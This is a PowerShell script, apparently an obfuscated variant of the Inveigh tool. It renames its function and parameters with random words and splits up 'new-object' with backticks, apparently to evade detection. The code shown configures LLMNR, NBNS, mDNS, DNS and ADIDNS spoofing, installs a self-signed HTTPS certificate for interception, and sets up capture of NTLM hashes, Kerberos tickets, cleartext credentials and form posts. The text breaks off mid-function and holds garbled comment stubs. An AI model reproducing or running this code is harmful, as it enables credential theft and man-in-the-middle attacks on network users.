function Invoke-LightOval
{

# Microsoft".

# Microsoft".
[CmdletBinding()]
param
( 
    [parameter(Mandatory=$false)][Array]$LiveSedate = ("isatap","wpad"),
    [parameter(Mandatory=$false)][Array]$OrangeDog = "",
    [parameter(Mandatory=$false)][Array]$ExpandNest = "Firefox",
    [parameter(Mandatory=$false)][Array]$BreezyDesign = ("139","445"),
    [parameter(Mandatory=$false)][Array]$FairAblaze = "",
    [parameter(Mandatory=$false)][Array]$BikeLoud = "",
    [parameter(Mandatory=$false)][Array]$HoleRoute = "",
    [parameter(Mandatory=$false)][Array]$WoozyClose = "",
    [parameter(Mandatory=$false)][Array]$ObeyAttack = "",
    [parameter(Mandatory=$false)][Array]$RecordRobust = "",
    [parameter(Mandatory=$false)][Array]$RobustFail = "Firefox",
    [parameter(Mandatory=$false)][Int]$FailDad = "-1",
    [parameter(Mandatory=$false)][Int]$CycleLovely = "",
    [parameter(Mandatory=$false)][Int]$IceFix = "4",
    [parameter(Mandatory=$false)][Int]$FarDry = "600",
    [parameter(Mandatory=$false)][Int]$HandsHop = "30",
    [parameter(Mandatory=$false)][Int]$LunchCheat = "80",
    [parameter(Mandatory=$false)][Int]$HarmFruit = "443",
    [parameter(Mandatory=$false)][Int]$KindLick = "2",
    [parameter(Mandatory=$false)][Int]$TeaseNasty = "30",
    [parameter(Mandatory=$false)][Int]$MurderOffer = "120",
    [parameter(Mandatory=$false)][Int]$BlushCattle = "165",
    [parameter(Mandatory=$false)][Int]$MournMean = "",
    [parameter(Mandatory=$false)][Int]$OafishAllow = "8492",
    [parameter(Mandatory=$false)][Int]$MatterOffice = "",
    [parameter(Mandatory=$false)][Int]$GrowthWind = "",
    [parameter(Mandatory=$false)][Int]$RuralOpen = "",
    [parameter(Mandatory=$false)][Int]$SmokeFang = "",
    [parameter(Mandatory=$false)][Int]$WrongAnts = "30",
    [parameter(Mandatory=$false)][Int]$OwnBump = "0",
    [parameter(Mandatory=$false)][Int]$SameSneaky = "0",
    [parameter(Mandatory=$false)][String]$TrapJoin = "",
    [parameter(Mandatory=$false)][String]$KnownFood = "",
    [parameter(Mandatory=$false)][String]$StoryFurry = "",
    [parameter(Mandatory=$false)][String]$BouncyEven = "wpad",
    [parameter(Mandatory=$false)][String]$ShinyAunt = "wpad2",
    [parameter(Mandatory=$false)][String]$FullGrin = "",
    [parameter(Mandatory=$false)][String]$SuperbBlood = "ADFS",
    [parameter(Mandatory=$false)][String]$SwingHorses = "text/html",
    [parameter(Mandatory=$false)][String]$StewLean = "",
    [parameter(Mandatory=$false)][String]$BadgeKind = "",
    [parameter(Mandatory=$false)][String]$YawnOdd = "",
    [parameter(Mandatory=$false)][String]$PiesWound = "Inveigh",
    [parameter(Mandatory=$false)][String]$FetchRobust = "localhost",
    [parameter(Mandatory=$false)][String]$DelayValue = "WPAD",
    [parameter(Mandatory=$false)][String]$ReasonTrust = "function FindProxyForURL(url,host){return `"DIRECT`";}",
    [parameter(Mandatory=$false)][ValidatePattern('^[A-Fa-f0-9]{16}$')][String]$HeavySmall = "",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$EscapeArch = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Combo","NS","Wildcard")][Array]$TourManage,
    [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$ViewNice = "DomainDNSZones",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HeatIll = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$CuteGroup = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HomelyShow = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$BootShrill = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileOutput = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$FileUnique = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ChargeClap = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SourBottle = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SomberBang = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HeapDetect = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$LipMeat = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$WhiteNote = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShinyUppity = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$BoilClever = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$PeckFirst = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$SeaEarth = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NoticeLiquid = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$JumpyWrench = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$DollHead = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$NorthAmuck = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$PlugTour = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$JokeFaulty = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$RelyNotice = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$HoverMug = "Y",
    [parameter(Mandatory=$false)][ValidateSet("Y","N")][String]$ShopStop = "N",
    [parameter(Mandatory=$false)][ValidateSet("Y","N","Low","Medium")][String]$RottenBed = "N",
    [parameter(Mandatory=$false)][ValidateSet("Auto","Y","N")][String]$LinenTrick = "Auto",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$SkirtStone = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("QU","QM")][Array]$WantLittle = @("QU"),
    [parameter(Mandatory=$false)][ValidateSet("00","03","20","1B","1C","1D","1E")][Array]$ThawMiddle = @("00","20"),
    [parameter(Mandatory=$false)][ValidateSet("File","Memory")][String]$SlimyCable = "",
    [parameter(Mandatory=$false)][ValidateSet("Basic","NTLM","NTLMNoESS")][String]$LightDesign = "NTLM",
    [parameter(Mandatory=$false)][ValidateSet("0","1","2")][String]$BaseBright = "0",
    [parameter(Mandatory=$false)][ValidateSet("Anonymous","Basic","NTLM","NTLMNoESS")][String]$LoadTrade = "NTLM",
    [parameter(Mandatory=$false)][ValidateScript({$_.Length -eq 64})][String]$LearnHelp,
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$FileOutputDirectory = "",
    [parameter(Mandatory=$false)][ValidateScript({Test-Path $_})][String]$YummyShame = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$RightSnail = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$SmashDolls = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$NorthLumpy = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$PreachBad = "0.0.0.0",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$StickLame = "",
    [parameter(Mandatory=$false)][ValidateScript({$_ -match [System.Net.IPAddress]$_})][String]$PlayIdea = "",
    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$BlackFilthy,
    [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$MilkyCelery,
    [parameter(Mandatory=$false)][Switch]$MeekSmoggy,
    [parameter(ValueFromRemainingArguments=$true)]$TongueShrug
)

# Microsoft".
# Microsoft".
if($TongueShrug)
{
    Write-TableSteam "[-] $($TongueShrug) is not a valid parameter"
    throw
}

$WoolSnails = "1.506"

if(!$SmashDolls)
{ 

    try
    {
        $SmashDolls = (Test-RoundFace 127.0.0.1 -count 1 | Select-Object -ExpandProperty Ipv4Address)
    }
    catch
    {
        Write-TableSteam "[-] Error finding local IP, specify manually with -SmashDolls"
        throw
    }

}

if(!$StickLame)
{
    $StickLame = $SmashDolls
}

if($TourManage)
{

    if(!$KnownFood -or !$TrapJoin -or $StoryFurry -or !$FullGrin)
    {

        try
        {
            $DapperHurry = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-TableSteam "[-] $($_.Exception.Message)"
            throw
        }

        if(!$KnownFood)
        {
            $KnownFood = $DapperHurry.PdcRoleOwner.Name
        }
    
        if(!$TrapJoin)
        {
            $TrapJoin = $DapperHurry.Name
        }

        if(!$StoryFurry)
        {
            $StoryFurry = $DapperHurry.Forest
        }
    
        if(!$FullGrin)
        {
            $FullGrin = $DapperHurry.Name
        }

    }

}

if($StewLean -or $BadgeKind)
{

    if(!$YummyShame)
    {
        Write-TableSteam "[-] You must specify an -HTTPDir when using either -StewLean or -BadgeKind"
        throw
    }

}

if($HeapDetect -eq 'Y' -and !$MilkyCelery -and !$LearnHelp)
{
    Write-TableSteam "[-] You must specify a -MilkyCelery or -LearnHelp when enabling Kerberos capture"
    throw
}

if($PlayIdea -or $RuralOpen)
{

    if(!$PlayIdea)
    {
        Write-TableSteam "[-] You must specify a -RuralOpen to go with -PlayIdea"
        throw
    }

    if(!$RuralOpen)
    {
        Write-TableSteam "[-] You must specify a -PlayIdea to go with -RuralOpen"
        throw
    }

}

if($SeaEarth -eq 'Y' -and !$NorthLumpy)
{
    Write-TableSteam "[-] You must specify a -NorthLumpy if enabling -SeaEarth"
    throw
}

if(!$FileOutputDirectory)
{ 
    $SilkySmelly = $TemptWarn.Path
}
else
{
    $SilkySmelly = $FileOutputDirectory
}

if(!$LightOval)
{
    $GrinFamous:inveigh = [HashTable]::Synchronized(@{})
    $LightOval.cleartext_list = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.enumerate = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.IP_capture_list = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.log = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.kerberos_TGT_list = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.kerberos_TGT_username_list = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.NTLMv1_list = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.NTLMv1_username_list = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.NTLMv2_list = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.NTLMv2_username_list = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.POST_request_list = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.valid_host_list = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.ADIDNS_table = [HashTable]::Synchronized(@{})
    $LightOval.relay_privilege_table = [HashTable]::Synchronized(@{})
    $LightOval.relay_failed_login_table = [HashTable]::Synchronized(@{})
    $LightOval.relay_history_table = [HashTable]::Synchronized(@{})
    $LightOval.request_table = [HashTable]::Synchronized(@{})
    $LightOval.session_socket_table = [HashTable]::Synchronized(@{})
    $LightOval.session_table = [HashTable]::Synchronized(@{})
    $LightOval.session_message_ID_table = [HashTable]::Synchronized(@{})
    $LightOval.session_lock_table = [HashTable]::Synchronized(@{})
    $LightOval.SMB_session_table = [HashTable]::Synchronized(@{})
    $LightOval.domain_mapping_table = [HashTable]::Synchronized(@{})
    $LightOval.group_table = [HashTable]::Synchronized(@{})
    $LightOval.session_count = 0
    $LightOval.session = @()
}

if($LightOval.running)
{
    Write-TableSteam "[-] Inveigh is already running"
    throw
}

$LightOval.stop = $false

if(!$LightOval.relay_running)
{
    $LightOval.cleartext_file_queue = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.console_queue = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.HTTP_challenge_queue = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.log_file_queue = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.NTLMv1_file_queue = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.NTLMv2_file_queue = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.output_queue = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.POST_request_file_queue = ne`w-`obje`ct System.Collections.ArrayList
    $LightOval.HTTP_session_table = [HashTable]::Synchronized(@{})
    $LightOval.console_input = $true
    $LightOval.console_output = $false
    $LightOval.file_output = $false
    $LightOval.HTTPS_existing_certificate = $false
    $LightOval.HTTPS_force_certificate_delete = $false
    $LightOval.log_output = $true
    $LightOval.cleartext_out_file = $SilkySmelly + "\Inveigh-AskEffect.txt"
    $LightOval.log_out_file = $SilkySmelly + "\Inveigh-BatAfraid.txt"
    $LightOval.NTLMv1_out_file = $SilkySmelly + "\Inveigh-MarketJuggle.txt"
    $LightOval.NTLMv2_out_file = $SilkySmelly + "\Inveigh-WishMetal.txt"
    $LightOval.POST_request_out_file = $SilkySmelly + "\Inveigh-FormInput.txt"
}

if($LinenTrick -eq 'Auto')
{
    $DressGround = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
}
else
{
 
    if($LinenTrick -eq 'Y')
    {
        $MachoUnique = [Bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")
        $DressGround = $true
    }
    else
    {
        $DressGround = $false
    }
    
}

if($ShopStop -eq 'Y')
{

    $GroundTest = netsh advfirewall show allprofiles state | Where-Object {$_ -match 'ON'}

    if($ChargeClap -eq 'Y')
    {
        $PoliteSquare = netstat -anp TCP | findstr LISTENING | findstr /C:"$RightSnail`:$LunchCheat "
    }

    if($SourBottle -eq 'Y')
    {
        $DustyArm = netstat -anp TCP | findstr LISTENING | findstr /C:"$RightSnail`:$HarmFruit "
    }

    if($JumpyWrench -eq 'Y')
    {
        $LethalFrog = netstat -anp TCP | findstr LISTENING | findstr /C:"$RightSnail`:$OafishAllow "
    }

    if($HomelyShow -eq 'Y' -and !$DressGround)
    {
        $BottleRush = netstat -anp UDP | findstr /C:"0.0.0.0:53 "
        $BottleRush = $false
    }

    if($LipMeat -eq 'Y' -and !$DressGround)
    {
        $YarnLate = netstat -anp UDP | findstr /C:"0.0.0.0:5355 "
        $YarnLate = $false
    }

    if($BoilClever -eq 'Y' -and !$DressGround)
    {
        $ArtTested = netstat -anp UDP | findstr /C:"0.0.0.0:5353 "
    }

}

if(!$DressGround)
{

    if($SourBottle -eq 'Y')
    {
        Write-TableSteam "[-] HTTPS requires elevated privileges"
        throw
    }

    if($PlugTour -eq 'Y')
    {
        Write-TableSteam "[-] SpooferLearning requires elevated privileges"
        throw
    }

    if($SlimyCable -eq 'File')
    {
        Write-TableSteam "[-] Pcap file output requires elevated privileges"
        throw
    }

    if(!$WickedRare.ContainsKey('NBNS'))
    {
        $PeckFirst = "Y"
    }

    $NorthAmuck = "N"
}

$LightOval.hostname_spoof = $false
$LightOval.running = $true

if($HoverMug -eq 'Y')
{
    $LightOval.status_output = $true
}
else
{
    $LightOval.status_output = $false
}

if($NoticeLiquid -eq 'Y')
{
    $LightOval.output_stream_only = $true
}
else
{
    $LightOval.output_stream_only = $false
}

if($MeekSmoggy)
{

    if($DressGround)
    {
        $HomelyShow = "N"
        $LipMeat = "N"
        $BoilClever = "N"
        $PeckFirst = "N"
        $ChargeClap = "N"
        $SourBottle = "N"
        $JumpyWrench = "N"
    }
    else
    {
        $ChargeClap = "N"
        $SourBottle = "N"
        $JumpyWrench = "N"
    }

}

if($BaseBright -eq 1) # Microsoft".
{
    $LightOval.tool = 1
    $LightOval.output_stream_only = $true
    $LightOval.newline = $null
    $RottenBed = "N"

}
elseif($BaseBright -eq 2) # Microsoft".
{
    $LightOval.tool = 2
    $LightOval.output_stream_only = $true
    $LightOval.console_input = $false
    $LightOval.newline = $null
    $WhiteNote = "N"
    $DollHead = "N"

    switch ($RottenBed)
    {

        'Low'
        {
            $RottenBed = "Low"
        }

        'Medium'
        {
            $RottenBed = "Medium"
        }

        default
        {
            $RottenBed = "Y"
        }

    }

}
else
{
    $LightOval.tool = 0
    $LightOval.newline = $null
}

$LightOval.netBIOS_domain = (Get-ChildItem -path env:userdomain).Value
$LightOval.computer_name = (Get-ChildItem -path env:computername).Value

try
{
    $LightOval.DNS_domain = ((Get-ChildItem -path env:userdnsdomain -ErrorAction 'SilentlyContinue').Value).ToLower()
    $LightOval.DNS_computer_name = ($LightOval.computer_name + "." + $LightOval.DNS_domain).ToLower()

    if(!$LightOval.domain_mapping_table.($LightOval.netBIOS_domain))
    {
        $LightOval.domain_mapping_table.Add($LightOval.netBIOS_domain,$LightOval.DNS_domain)
    }

}
catch
{
    $LightOval.DNS_domain = $LightOval.netBIOS_domain
    $LightOval.DNS_computer_name = $LightOval.computer_name
}

# Microsoft".
# Microsoft".
$LightOval.output_queue.Add("[*] Inveigh $WoolSnails started at $(Get-Date -format s)") > $null

if($LinenTrick -eq 'Y' -or $DressGround)
{

    if(($LinenTrick -eq 'Auto' -and $DressGround) -or ($LinenTrick -eq 'Y' -and $MachoUnique))
    {
        $LightOval.output_queue.Add("[+] Elevated Privilege Mode = Enabled")  > $null
    }
    else
    {
        $LightOval.output_queue.Add("[-] Elevated Privilege Mode Enabled But Check Failed")  > $null
    }

}
else
{
    $LightOval.output_queue.Add("[!] Elevated Privilege Mode = Disabled")  > $null
    $NorthAmuck = "N"
}

if($GroundTest)
{
    $LightOval.output_queue.Add("[!] Windows Firewall = Enabled")  > $null
}

$LightOval.output_queue.Add("[+] Primary IP Address = $SmashDolls")  > $null

if($HomelyShow -eq 'Y' -or $LipMeat -eq 'Y' -or $BoilClever -eq 'Y' -or $PeckFirst -eq 'Y')
{
    $LightOval.output_queue.Add("[+] Spoofer IP Address = $StickLame")  > $null
}

if($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y')
{

    if($OwnBump -gt 0)
    {
        $LightOval.output_queue.Add("[+] Spoofer Threshold Host = $OwnBump")  > $null
    }

    if($SameSneaky -gt 0)
    {
        $LightOval.output_queue.Add("[+] Spoofer Threshold Network = $SameSneaky")  > $null
    }
    
}

if($TourManage)
{
    $LightOval.ADIDNS = $TourManage
    $LightOval.output_queue.Add("[+] ADIDNS Spoofer = $TourManage")  > $null
    $LightOval.output_queue.Add("[+] ADIDNS Hosts Ignore = " + ($LiveSedate -join ","))  > $null
    $LightOval.output_queue.Add("[+] ADIDNS Domain Controller = $KnownFood")  > $null
    $LightOval.output_queue.Add("[+] ADIDNS Domain = $TrapJoin")  > $null
    $LightOval.output_queue.Add("[+] ADIDNS Forest = $StoryFurry")  > $null
    $LightOval.output_queue.Add("[+] ADIDNS TTL = $FarDry")  > $null
    $LightOval.output_queue.Add("[+] ADIDNS Zone = $FullGrin")  > $null

    if($LightOval.ADIDNS -contains 'NS')
    {
        $LightOval.output_queue.Add("[+] ADIDNS NS Record = $BouncyEven")  > $null
        $LightOval.output_queue.Add("[+] ADIDNS NS Target Record = $ShinyAunt")  > $null
    }

    if($HeatIll -eq 'Y')
    {
        $LightOval.output_queue.Add("[+] ADIDNS ACE Add = Enabled")  > $null
    }
    else
    {
        $LightOval.output_queue.Add("[+] ADIDNS ACE Add = Disabled")  > $null    
    }

    if($CuteGroup -eq 'Y')
    {
        $LightOval.output_queue.Add("[+] ADIDNS Cleanup = Enabled")  > $null
    }
    else
    {
        $LightOval.output_queue.Add("[+] ADIDNS Cleanup = Disabled")  > $null    
    }

    if($TourManage -eq 'Combo')
    {
        $LightOval.request_table_updated = $true
    }

}
else
{
    $LightOval.output_queue.Add("[+] ADIDNS Spoofer = Disabled")  > $null
}

if($HomelyShow -eq 'Y')
{

    if($DressGround -or !$BottleRush)
    {
        $LightOval.output_queue.Add("[+] DNS Spoofer = Enabled")  > $null
        $LightOval.output_queue.Add("[+] DNS TTL = $HandsHop Seconds")  > $null
    }
    else
    {
        $HomelyShow = "N"
        $LightOval.output_queue.Add("[-] DNS Spoofer Disabled Due To In Use Port 53")  > $null
    }

}
else
{
    $LightOval.output_queue.Add("[+] DNS Spoofer = Disabled")  > $null
}

if($LipMeat -eq 'Y')
{

    if($DressGround -or !$YarnLate)
    {
        $LightOval.output_queue.Add("[+] LLMNR Spoofer = Enabled")  > $null
        $LightOval.output_queue.Add("[+] LLMNR TTL = $TeaseNasty Seconds")  > $null
    }
    else
    {
        $LipMeat = "N"
        $LightOval.output_queue.Add("[-] LLMNR Spoofer Disabled Due To In Use Port 5355")  > $null
    }

}
else
{
    $LightOval.output_queue.Add("[+] LLMNR Spoofer = Disabled")  > $null
}

if($BoilClever -eq 'Y')
{

    if($DressGround -or !$ArtTested)
    {
        $GripWrong = $WantLittle -join ","

        if($WantLittle.Count -eq 1)
        {
            $LightOval.output_queue.Add("[+] mDNS Spoofer For Type $GripWrong = Enabled")  > $null
        }
        else
        {
            $LightOval.output_queue.Add("[+] mDNS Spoofer For Types $GripWrong = Enabled")  > $null
        }

        $LightOval.output_queue.Add("[+] mDNS TTL = $MurderOffer Seconds")  > $null
    }
    else
    {
        $BoilClever = "N"
        $LightOval.output_queue.Add("[-] mDNS Spoofer Disabled Due To In Use Port 5353")  > $null
    }

}
else
{
    $LightOval.output_queue.Add("[+] mDNS Spoofer = Disabled")  > $null
}

if($PeckFirst -eq 'Y')
{
    $CreepyIcy = $ThawMiddle -join ","
    
    if($ThawMiddle.Count -eq 1)
    {
        $LightOval.output_queue.Add("[+] NBNS Spoofer For Type $CreepyIcy = Enabled")  > $null
    }
    else
    {
        $LightOval.output_queue.Add("[+] NBNS Spoofer For Types $CreepyIcy = Enabled")  > $null
    }

}
else
{
    $LightOval.output_queue.Add("[+] NBNS Spoofer = Disabled")  > $null
}

if($SeaEarth -eq 'Y')
{   
    $LightOval.output_queue.Add("[+] NBNS Brute Force Spoofer Target = $NorthLumpy") > $null
    $LightOval.output_queue.Add("[+] NBNS Brute Force Spoofer IP Address = $StickLame") > $null
    $LightOval.output_queue.Add("[+] NBNS Brute Force Spoofer Hostname = $DelayValue") > $null

    if($MournMean)
    {
        $LightOval.output_queue.Add("[+] NBNS Brute Force Pause = $MournMean Seconds") > $null
    }

}

if($PeckFirst -eq 'Y' -or $SeaEarth -eq 'Y')
{
    $LightOval.output_queue.Add("[+] NBNS TTL = $BlushCattle Seconds") > $null
}

if($PlugTour -eq 'Y' -and ($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y'))
{
    $LightOval.output_queue.Add("[+] Spoofer Learning = Enabled")  > $null

    if($SmokeFang -eq 1)
    {
        $LightOval.output_queue.Add("[+] Spoofer Learning Delay = $SmokeFang Minute")  > $null
    }
    elseif($SmokeFang -gt 1)
    {
        $LightOval.output_queue.Add("[+] Spoofer Learning Delay = $SmokeFang Minutes")  > $null
    }
    
    if($WrongAnts -eq 1)
    {
        $LightOval.output_queue.Add("[+] Spoofer Learning Interval = $WrongAnts Minute")  > $null
    }
    elseif($WrongAnts -eq 0)
    {
        $LightOval.output_queue.Add("[+] Spoofer Learning Interval = Disabled")  > $null
    }
    elseif($WrongAnts -gt 1)
    {
        $LightOval.output_queue.Add("[+] Spoofer Learning Interval = $WrongAnts Minutes")  > $null
    }

}

if($BikeLoud -and ($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y'))
{
    $LightOval.output_queue.Add("[+] Spoofer Hosts Reply = " + ($BikeLoud -join ","))  > $null
}

if($HoleRoute -and ($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y'))
{
    $LightOval.output_queue.Add("[+] Spoofer Hosts Ignore = " + ($HoleRoute -join ","))  > $null
}

if($WoozyClose -and ($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y'))
{
    $LightOval.output_queue.Add("[+] Spoofer IPs Reply = " + ($WoozyClose -join ","))  > $null
}

if($ObeyAttack -and ($LipMeat -eq 'Y' -or $PeckFirst -eq 'Y'))
{
    $LightOval.output_queue.Add("[+] Spoofer IPs Ignore = " + ($ObeyAttack -join ","))  > $null
}

if($RelyNotice -eq 'N')
{
    $LightOval.spoofer_repeat = $false
    $LightOval.output_queue.Add("[+] Spoofer Repeating = Disabled")  > $null
}
else
{
    $LightOval.spoofer_repeat = $true
}

if($NorthAmuck -eq 'Y' -and $DressGround)
{
    $LightOval.output_queue.Add("[+] SMB Capture = Enabled")  > $null
}
else
{
    $LightOval.output_queue.Add("[+] SMB Capture = Disabled")  > $null
}

if($ChargeClap -eq 'Y')
{

    if($PoliteSquare)
    {
        $ChargeClap = "N"
        $LightOval.output_queue.Add("[-] HTTP Capture Disabled Due To In Use Port $LunchCheat")  > $null
    }
    else
    {

        if($RightSnail -ne '0.0.0.0')
        {
            $LightOval.output_queue.Add("[+] HTTP IP = $RightSnail") > $null
        }

        if($LunchCheat -ne 80)
        {
            $LightOval.output_queue.Add("[+] HTTP Port = $LunchCheat") > $null
        }

        $LightOval.output_queue.Add("[+] HTTP Capture = Enabled")  > $null
    }

}
else
{
    $LightOval.output_queue.Add("[+] HTTP Capture = Disabled")  > $null
}

if($SourBottle -eq 'Y')
{

    if($DustyArm)
    {
        $SourBottle = "N"
        $LightOval.HTTPS = $false
        $LightOval.output_queue.Add("[-] HTTPS Capture Disabled Due To In Use Port $HarmFruit")  > $null
    }
    else
    {

        try
        { 
            $LightOval.certificate_issuer = $PiesWound
            $LightOval.certificate_CN = $FetchRobust
            $LightOval.output_queue.Add("[+] HTTPS Certificate Issuer = " + $LightOval.certificate_issuer)  > $null
            $LightOval.output_queue.Add("[+] HTTPS Certificate CN = " + $LightOval.certificate_CN)  > $null
            $FoundCute = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $LightOval.certificate_issuer})

            if(!$FoundCute)
            {
                # Microsoft".
                $TrustStingy = ne`w-`obje`ct -com "X509Enrollment.CX500DistinguishedName"
                $TrustStingy.Encode( "CN=" + $LightOval.certificate_CN, $TrustStingy.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $ExistAmuse = ne`w-`obje`ct -com "X509Enrollment.CX500DistinguishedName"
                $ExistAmuse.Encode("CN=" + $LightOval.certificate_issuer, $TrustStingy.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $WetMinute = ne`w-`obje`ct -com "X509Enrollment.CX509PrivateKey"
                $WetMinute.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
                $WetMinute.KeySpec = 2
                $WetMinute.Length = 2048
			    $WetMinute.MachineContext = 1
                $WetMinute.Create()
                $NoticeMean = ne`w-`obje`ct -com "X509Enrollment.CObjectId"
			    $NoticeMean.InitializeFromValue("1.3.6.1.5.5.7.3.1")
			    $PowerGrade = ne`w-`obje`ct -com "X509Enrollment.CObjectIds.1"
			    $PowerGrade.Add($NoticeMean)
			    $DanceShort = ne`w-`obje`ct -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
			    $DanceShort.InitializeEncode($PowerGrade)
			    $DollsRound = ne`w-`obje`ct -com "X509Enrollment.CX509CertificateRequestCertificate"
			    $DollsRound.InitializeFromPrivateKey(2,$WetMinute,"")
			    $DollsRound.Subject = $TrustStingy
			    $DollsRound.Issuer = $ExistAmuse
			    $DollsRound.NotBefore = (Get-Date).AddDays(-271)
			    $DollsRound.NotAfter = $DollsRound.NotBefore.AddDays(824)
			    $AmuckVersed = ne`w-`obje`ct -ComObject X509Enrollment.CObjectId
			    $AmuckVersed.InitializeFromAlgorithmName(1,0,0,"SHA256")
			    $DollsRound.HashAlgorithm = $AmuckVersed
                $DollsRound.X509Extensions.Add($DanceShort)
                $MomThrill = ne`w-`obje`ct -com "X509Enrollment.CX509ExtensionBasicConstraints"
			    $MomThrill.InitializeEncode("true",1)
                $DollsRound.X509Extensions.Add($MomThrill)
                $DollsRound.Encode()
                $SettleStale = ne`w-`obje`ct -com "X509Enrollment.CX509Enrollment"
			    $SettleStale.InitializeFromRequest($DollsRound)
			    $FryRoom = $SettleStale.CreateRequest(0)
                $SettleStale.InstallResponse(2,$FryRoom,0,"")
                $LightOval.certificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $LightOval.certificate_issuer})
            }
            else
            {
                
                if($SomberBang -eq 'Y')
                {
                    $LightOval.HTTPS_force_certificate_delete = $true
                }

                $LightOval.HTTPS_existing_certificate = $true
                $LightOval.output_queue.Add("[+] HTTPS Capture = Using Existing Certificate")  > $null
            }
            
            $LightOval.HTTPS = $true

            if($RightSnail -ne '0.0.0.0')
            { 
                $LightOval.output_queue.Add("[+] HTTPS IP = $RightSnail") > $null
            }

            if($HarmFruit -ne 443)
            {   
                $LightOval.output_queue.Add("[+] HTTPS Port = $HarmFruit") > $null
            }

            $LightOval.output_queue.Add("[+] HTTPS Capture = Enabled")  > $null

        }
        catch
        {
            $SourBottle = "N"
            $LightOval.HTTPS = $false
            $LightOval.output_queue.Add("[-] HTTPS Capture Disabled Due To Certificate Error")  > $null
        }

    }

}
else
{
    $LightOval.output_queue.Add("[+] HTTPS Capture = Disabled")  > $null
}

if($ChargeClap -eq 'Y' -or $SourBottle -eq 'Y')
{
    $LightOval.output_queue.Add("[+] HTTP/HTTPS Authentication = $SkirtStone")  > $null

    if($YummyShame -and !$YawnOdd)
    {
        $LightOval.output_queue.Add("[+] HTTP/HTTPS Directory = $YummyShame")  > $null

        if($StewLean)
        {
            $LightOval.output_queue.Add("[+] HTTP/HTTPS Default Response File = $StewLean")  > $null
        }

        if($BadgeKind)
        {
            $LightOval.output_queue.Add("[+] HTTP/HTTPS Default Response Executable = $BadgeKind")  > $null
        }

    }

    if($YawnOdd)
    {
        $LightOval.output_queue.Add("[+] HTTP/HTTPS Response = Enabled")  > $null
    }

